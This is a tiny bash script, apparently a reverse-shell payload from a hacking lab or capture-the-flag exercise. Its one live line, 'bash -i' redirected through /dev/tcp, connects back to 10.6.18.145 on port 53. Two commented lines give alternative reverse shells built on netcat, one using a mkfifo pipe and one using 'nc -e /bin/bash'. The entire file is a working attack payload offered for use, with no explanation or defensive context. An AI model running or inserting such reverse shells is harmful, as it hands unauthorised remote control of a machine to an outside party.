#!/bin/bash
#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.18.145 53 >/tmp/f

bash -c 'exec bash -i &>/dev/tcp/10.6.18.145/53<&1'
#nc -e /bin/bash 10.6.18.145 53
